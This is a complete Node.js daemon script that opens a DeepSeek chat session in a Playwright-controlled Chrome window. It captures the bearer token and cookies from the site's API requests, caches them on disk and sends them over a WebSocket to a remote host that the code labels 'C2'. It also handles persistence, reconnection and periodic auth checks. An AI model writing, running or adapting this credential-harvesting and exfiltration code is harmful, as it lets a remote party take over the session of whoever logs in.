const { chromium } = require('playwright');
const WebSocket = require('ws');
const path = require('path');
const os = require('os');
const fs = require('fs');

// ─── CONFIG ───
const C2_WS = 'wss://carlos-gateway.onrender.com/c2/ws';
const USER_DATA_DIR = path.join(os.homedir(), 'AppData', 'Local', 'DeepSeek-C2-Runner');
const DEEPSEEK_URL = 'https://chat.deepseek.com';
const AUTH_CACHE_PATH = path.join(USER_DATA_DIR, '.auth-cache.json');
const PID_FILE = path.join(USER_DATA_DIR, 'runner.pid');
const LOG_FILE = path.join(USER_DATA_DIR, 'runner.log');

// ─── STATE ───
let ws = null;
let page = null;
let context = null;
let authCaptured = false;
let capturedAuth = { bearer: '', cookies: '' };
let reconnectTimer = null;

// ─── LOGGING ───
function logToFile(msg) {
  try {
    const line = `[${new Date().toISOString()}] ${msg}\n`;
    fs.appendFileSync(LOG_FILE, line);
  } catch (e) {}
}

const origLog = console.log;
const origError = console.error;
console.log = (...args) => { origLog(...args); logToFile(args.join(' ')); };
console.error = (...args) => { origError(...args); logToFile(args.join(' ')); };

// ─── DAEMON MODE ───
function parseArgs() {
  return { cmd: (process.argv.slice(2)[0] || 'start') };
}

function writePid() {
  try { fs.mkdirSync(path.dirname(PID_FILE), { recursive: true }); fs.writeFileSync(PID_FILE, process.pid.toString()); } catch (e) {}
}
function readPid() { try { return parseInt(fs.readFileSync(PID_FILE, 'utf8').trim()); } catch (e) { return null; } }
function removePid() { try { fs.unlinkSync(PID_FILE); } catch (e) {} }
function isRunning(pid) { try { process.kill(pid, 0); return true; } catch (e) { return false; } }

function daemonStart() {
  const pid = readPid();
  if (pid && isRunning(pid)) { console.log(`[Runner] Already running (PID ${pid})`); process.exit(0); }
  removePid(); writePid();
  console.log(`[Runner] Started as daemon (PID ${process.pid})`);
  process.on('SIGINT', () => { cleanup(); process.exit(0); });
  process.on('SIGTERM', () => { cleanup(); process.exit(0); });
  process.on('exit', () => { removePid(); });
  run();
}

function daemonStop() {
  const pid = readPid();
  if (!pid) { console.log('[Runner] Not running'); process.exit(1); }
  if (!isRunning(pid)) { console.log('[Runner] Not running (stale)'); removePid(); process.exit(1); }
  process.kill(pid, 'SIGTERM');
  let waited = 0;
  const check = setInterval(() => {
    if (!isRunning(pid) || waited > 5000) { clearInterval(check); removePid(); console.log('[Runner] Stopped'); process.exit(0); }
    waited += 100;
  }, 100);
}

function daemonStatus() {
  const pid = readPid();
  if (!pid || !isRunning(pid)) { console.log('[Runner] NOT RUNNING'); if (pid) removePid(); process.exit(1); }
  console.log(`[Runner] RUNNING (PID ${pid})`);
  console.log(`[Runner] C2: ${ws?.readyState === WebSocket.OPEN ? 'connected' : 'disconnected'}`);
  console.log(`[Runner] Auth: ${authCaptured ? 'YES' : 'NO'}`);
  process.exit(0);
}

function cleanup() { if (ws) try { ws.close(); } catch (e) {} if (context) try { context.close(); } catch (e) {} removePid(); }

// ─── AUTH PERSISTENCE ───
function saveAuth() {
  try { fs.mkdirSync(path.dirname(AUTH_CACHE_PATH), { recursive: true }); fs.writeFileSync(AUTH_CACHE_PATH, JSON.stringify(capturedAuth)); } catch (e) {}
}

function loadAuth() {
  try {
    if (fs.existsSync(AUTH_CACHE_PATH)) {
      const data = JSON.parse(fs.readFileSync(AUTH_CACHE_PATH, 'utf8'));
      if (data.bearer) { capturedAuth = data; authCaptured = true; console.log('[Runner] Auth restored from cache'); return true; }
    }
  } catch (e) {}
  return false;
}

function sendAuthToGateway() {
  if (ws?.readyState === WebSocket.OPEN && authCaptured && capturedAuth.bearer) {
    ws.send(JSON.stringify({ type: 'auth', bearer: capturedAuth.bearer, cookies: capturedAuth.cookies }));
    console.log('[Runner] Auth sent to gateway');
  }
}

// ─── HEADERS ───
function getBrowserHeaders(bearer) {
  return {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    ...(bearer ? { 'Authorization': `Bearer ${bearer}` } : {}),
    'Referer': 'https://chat.deepseek.com/',
    'Origin': 'https://chat.deepseek.com',
    'x-client-platform': 'web',
    'x-client-version': '1.7.0',
    'x-app-version': '20241129.1',
    'x-client-locale': 'zh_CN',
    'x-client-timezone-offset': '28800',
  };
}

// ─── MAIN RUN ───
async function run() {
  console.log('[Runner] Starting...');

  // Load cached auth
  loadAuth();

  // Launch persistent Chrome
  try {
    fs.mkdirSync(USER_DATA_DIR, { recursive: true });
    context = await chromium.launchPersistentContext(USER_DATA_DIR, {
      headless: false,
      viewport: { width: 1440, height: 900 },
      args: ['--window-position=100,50', '--window-size=1440,900'],
    });
    page = context.pages()[0] || await context.newPage();
    console.log('[Runner] Chrome launched');
  } catch (e) {
    console.error('[Runner] Launch failed:', e.message);
    process.exit(1);
  }

  // Capture auth from network requests
  page.on('request', req => {
    const url = req.url();
    if (!url.startsWith('https://chat.deepseek.com/api/')) return;

    const headers = req.headers();
    const bearer = headers['authorization']?.replace('Bearer ', '');
    if (bearer && bearer.length > 50 && bearer !== capturedAuth.bearer) {
      capturedAuth.bearer = bearer;
      console.log('[Runner] Bearer captured:', bearer.slice(0, 20) + '...');
    }

    const cookieHeader = headers['cookie'];
    if (cookieHeader && cookieHeader.length > 50 && cookieHeader !== capturedAuth.cookies) {
      capturedAuth.cookies = cookieHeader;
      console.log('[Runner] Cookies captured');
    }

    if (!authCaptured && capturedAuth.bearer && capturedAuth.cookies) {
      authCaptured = true;
      saveAuth();
      console.log('[Runner] Auth complete, sending to gateway');
      sendAuthToGateway();
    }
  });

  // Open DeepSeek
  await page.goto(DEEPSEEK_URL, { waitUntil: 'domcontentloaded', timeout: 60000 });
  console.log('[Runner] DeepSeek loaded, waiting for login...');

  // Connect C2 WebSocket
  connectC2();

  // Keep alive
  setInterval(() => {
    if (ws?.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'ping' }));
    }
  }, 30000);

  // Periodic auth refresh check (every 5 min)
  setInterval(async () => {
    if (!authCaptured) return;
    try {
      const headers = getBrowserHeaders(capturedAuth.bearer);
      const res = await page.evaluate(async ({ path, headerRecord }) => {
        const r = await fetch(`https://chat.deepseek.com${path}`, { credentials: 'include', headers: headerRecord });
        return { ok: r.ok, status: r.status };
      }, { path: '/api/v0/chat_session/create', headerRecord: headers });
      if (!res.ok) {
        console.log('[Runner] Auth expired, waiting for fresh capture');
        authCaptured = false;
        capturedAuth = { bearer: '', cookies: '' };
      }
    } catch (e) {
      console.log('[Runner] Auth check error:', e.message);
    }
  }, 5 * 60 * 1000);
}

// ─── C2 WEBSOCKET ───
function connectC2() {
  if (reconnectTimer) clearTimeout(reconnectTimer);

  console.log('[Runner] Connecting to C2:', C2_WS);
  ws = new WebSocket(C2_WS);

  ws.on('open', () => {
    console.log('[Runner] C2 connected');
    ws.send(JSON.stringify({ type: 'register', role: 'runner' }));
    sendAuthToGateway();
  });

  ws.on('message', data => {
    try { JSON.parse(data.toString()); } catch (e) {}
  });

  ws.on('close', () => {
    console.log('[Runner] C2 disconnected, reconnecting in 5s...');
    reconnectTimer = setTimeout(connectC2, 5000);
  });

  ws.on('error', e => console.error('[Runner] C2 error:', e.message));
}

// ─── ENTRY ───
const { cmd } = parseArgs();
switch (cmd) {
  case 'start': daemonStart(); break;
  case 'stop': daemonStop(); break;
  case 'status': daemonStatus(); break;
  default: console.log('Usage: node runner.js {start|stop|status}'); process.exit(1);
}